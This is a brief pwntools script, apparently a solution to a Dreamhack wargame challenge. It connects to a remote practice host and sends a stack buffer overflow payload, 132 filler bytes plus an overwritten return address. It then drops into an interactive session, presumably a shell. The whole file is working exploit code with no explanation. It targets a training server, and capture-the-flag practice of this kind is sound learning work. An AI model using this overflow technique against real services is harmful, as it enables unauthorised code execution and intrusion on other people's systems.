from pwn import *

r=remote("host1.dreamhack.games",23218)
print("remote success")

payload="A"*132+"\xb9\x85\x04\x08"

r.send(payload)
r.interactive()

